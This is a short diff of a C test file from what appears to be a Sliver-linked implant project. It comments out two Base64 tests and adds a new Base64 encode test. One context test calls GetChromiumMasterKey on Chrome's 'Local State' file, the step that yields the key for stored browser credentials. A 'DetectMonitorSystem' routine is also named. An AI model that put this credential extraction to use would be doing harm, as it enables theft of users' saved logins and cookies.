@@ -675,20 +675,20 @@ void test35(void) {
 }
 
 void test36(void) {
-	CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
+	/*CHAR szEncodedStr[] = "SGVsbG8gV29ybGQ=";
 	DWORD cbOutput = 0;
 	LPSTR lpOutput = NULL;
 
 	lpOutput = Base64Decode(szEncodedStr, &cbOutput);
 	PrintFormatA("lpOutput: %s, cbOutput: %d\n", lpOutput, cbOutput);
-	FREE(lpOutput);
+	FREE(lpOutput);*/
 }
 
 void test37(void) {
 	BYTE CipherText[] = { 69, 100, 241, 205, 130, 19, 84, 64, 192, 139, 144, 144, 76, 102, 126, 178, 220, 49, 255, 50, 134, 6, 178, 19, 111, 101, 235, 109, 142, 220, 80, 109, 83, 183, 239, 211, 11, 38, 88, 81, 137, 198, 77, 175, 46, 180, 204, 247, 145, 70, 196, 223, 12, 79, 33, 202, 34, 241, 49, 43, 148, 167, 117, 64, 16, 81, 209, 90, 0, 122, 22, 15, 152, 4, 231, 162, 192, 64, 243, 108, 238, 189, 23, 193, 98, 223, 142, 236, 212, 44, 235, 226, 231, 187, 60, 154, 189, 50, 249, 188, 89, 56, 43, 67, 65, 253, 119, 243, 213, 25, 193, 238, 178, 173, 183, 205, 29, 36, 124, 149, 53, 236, 5, 153, 56, 160, 183, 249, 239, 241, 147, 240, 71, 202, 142, 114, 243, 109, 6, 173, 198, 119, 218, 123, 240, 242, 190, 91, 186, 14, 18, 149, 249, 58, 12, 16, 119, 211 };
 	LPSTR lpOutput = NULL;
 
-	lpOutput = SliverBase64Encode(CipherText, _countof(CipherText));
+	//lpOutput = SliverBase64Encode(CipherText, _countof(CipherText));
 	PrintFormatA("%s\n", lpOutput);
 	FREE(lpOutput);
 }
@@ -1890,12 +1890,17 @@ void test117(void) {
 	FREE(pResult);
 }
 
-void test118() {
+void test118(void) {
 	USER_DATA UserData;
 
 	SecureZeroMemory(&UserData, sizeof(UserData));
 	UserData.lpKeyPath = DuplicateStrW(L"C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", 0);
 	GetChromiumMasterKey(&UserData);
+}
+
+void test119(void) {
+	LPSTR lpResult = Base64Encode("Hello World", lstrlenA("Hello World"), FALSE);
+	PrintFormatA("%s\n", lpResult);
 }
 
 VOID DetectMonitorSystem(VOID)
@@ -2129,6 +2134,8 @@ int main(void) {
 	//test116();
 	//test117();
 	//test118();
+	//test119();
 	Final();
+
 	return 0;
 }
